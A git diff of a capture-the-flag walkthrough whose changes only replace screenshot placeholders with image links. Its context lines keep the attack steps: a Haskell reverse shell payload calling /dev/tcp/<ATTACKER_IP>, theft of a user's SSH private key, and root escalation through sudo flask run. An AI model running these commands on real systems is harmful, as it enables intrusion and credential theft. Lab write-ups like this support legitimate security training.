@@ -14,7 +14,7 @@
 nmap <TARGET_IP>
 ```
 
-[SCREEN01]
+<img width="650" height="243" alt="SCREEN01" src="https://github.com/user-attachments/assets/341d3e5e-f1d3-493d-b155-be7c9100b343" />
 
 2. Let's perform directory enumeration to find available endpoints
    - Found endpoint: `http://<TARGET_IP>:5001/submit`
@@ -30,7 +30,7 @@ main :: IO ()
 main = putStrLn "Hello World"
 ```
 
-[SCREEN02]
+<img width="639" height="97" alt="SCREEN02" src="https://github.com/user-attachments/assets/92e47b44-b2e0-46ce-b963-a5bc6a6ec0ac" />
 
 4. Set up a netcat listener and create a malicious Haskell reverse shell payload using `System.Process`
 
@@ -49,7 +49,7 @@ main = callCommand "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"
 cat /home/prof/user.txt
 ```
 
-[SCREEN03]
+<img width="648" height="49" alt="SCREEN03" src="https://github.com/user-attachments/assets/980701e4-a54d-4d2d-92a2-2b81ad556815" />
 
 ---
 
@@ -61,7 +61,7 @@ cat /home/prof/user.txt
 cat /home/prof/.ssh/id_rsa
 ```
 
-[SCREEN04]
+<img width="651" height="390" alt="SCREEN04" src="https://github.com/user-attachments/assets/dc8481b9-3ec6-47bb-b6d4-deea123fa36c" />
 
 2. Copy the private key to your local machine, set proper permissions on the SSH key and connect as prof user
 
@@ -77,7 +77,7 @@ ssh -i id_rsa prof@<TARGET_IP>
 sudo -l
 ```
 
-[SCREEN05]
+<img width="650" height="131" alt="SCREEN05" src="https://github.com/user-attachments/assets/636b19fc-5b73-466b-9756-fab75a01bb2d" />
 
 4. Abuse Flask's `FLASK_APP` environment variable to execute arbitrary Python code as root
 
@@ -87,7 +87,7 @@ export FLASK_APP=/tmp/app.py
 sudo /usr/bin/flask run
 ```
 
-[SCREEN06]
+<img width="649" height="145" alt="SCREEN06" src="https://github.com/user-attachments/assets/4e990082-88b3-4987-9360-8ee6021b1d9e" />
 
 5. Read the root flag from the root directory
 
@@ -95,4 +95,4 @@ sudo /usr/bin/flask run
 cat /root/root.txt
 ```
 
-[SCREEN07]
+<img width="648" height="31" alt="SCREEN07" src="https://github.com/user-attachments/assets/1a683f28-4d7f-43e2-98fe-21d6baff44c7" />
